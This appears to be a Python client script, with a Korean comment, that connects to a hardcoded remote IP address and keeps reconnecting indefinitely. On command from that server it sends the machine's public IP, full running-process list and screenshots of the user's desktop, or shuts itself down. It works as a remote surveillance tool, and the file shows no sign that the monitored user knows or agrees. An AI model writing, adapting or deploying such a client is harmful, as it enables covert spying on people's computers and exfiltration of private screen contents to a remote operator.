from msilib.schema import Error
import socket
import psutil
import requests
import select
import os
import pyautogui
import pickle
import cv2
from PIL import Image
from PIL import ImageGrab
from time import time, sleep
import numpy as np
import matplotlib.pyplot as plt

while True:
    try:
        HOST = '124.50.153.32'

        PORT = 9999       

        client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

        def connect2server(client_socket):
            try:
                client_socket.connect((HOST, PORT))
            except:
                print("Connection error")
                sleep(30 - time() % 1)
                connect2server(client_socket)

        connect2server(client_socket)

        while True:
            try:
                ready_to_read, ready_to_write, in_error = \
                    select.select([client_socket,], [client_socket,], [], 5)
            except select.error:
                client_socket.shutdown(2)
                client_socket.close()
                print('connection error')
                break
            data = client_socket.recv(1024)
            if data.decode() == "send":
                IPAddr = requests.get("http://ip.jsontest.com").json()['ip']
                pList = "--------------------------------------------------------" + "\n"
                for proc in psutil.process_iter():
                    pList = pList + str(proc) + "\n"
                pList = pList + "--------------------------------------------------------" + "\n" + ":-!?!-:" + IPAddr
                client_socket.sendall(pList.encode())
                print("Process List send complete")
            elif data.decode() == "exit":
                print("exitByServer")
                break
            elif data.decode() == "Connected":
                client_socket.sendall((requests.get("http://ip.jsontest.com").json()['ip']).encode())
                print(data.decode())
            elif data.decode() == "exitAll":
                print("server shutdown")
                break
            elif data.decode() == "exitApp":
                p = psutil.Process(os.getpid())
                p.terminate()
            elif data.decode() == "screen":
                if not os.path.isdir("C:\\Users\\%s\\Documents\\client" % os.getlogin()):
                    os.makedirs("C:\\Users\\%s\\Documents\\client" % os.getlogin())
                myScreenshot = pyautogui.screenshot().save("C:\\Users\\%s\\Documents\\client\\sc.png" % os.getlogin())
                im = Image.open("C:\\Users\\%s\\Documents\\client\\sc.png" % os.getlogin())
                img_np = np.array(im)
                print(img_np)
                client_socket.sendall(img_np)

        # 소켓을 닫습니다.
        client_socket.close()
        print("Restarting...")
        sleep(30 - time() % 1)
        print("Restarting complete")
    except Exception as e:
        print("restart due to error")
        print(e)
        continue
